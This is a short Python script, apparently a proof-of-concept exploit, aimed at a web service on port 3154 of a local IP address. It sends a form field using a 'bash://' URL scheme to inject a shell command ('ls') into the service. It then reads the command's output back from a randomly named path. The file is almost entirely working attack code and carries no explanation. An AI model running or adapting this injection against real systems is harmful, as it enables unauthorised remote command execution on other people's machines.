#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys, re, requests
import string, random, uuid, re

def generator(size=10, chars=string.digits):
    return hex(int(''.join(random.choice(chars) for _ in range(size))))

#ip = sys.argv[1]
ip = '192.168.0.100'

s = requests.Session()
'url=bash%3A%2F%2Fls%20-la%20lnks&lnk=testls'

file = generator()

payload = 'ls'

data = {'url':'bash://{}'.format(payload),'lnk':file}
s.post('http://{}:3154'.format(ip),data=data)
print(s.get('http://{}:3154/{}'.format(ip,file)).text)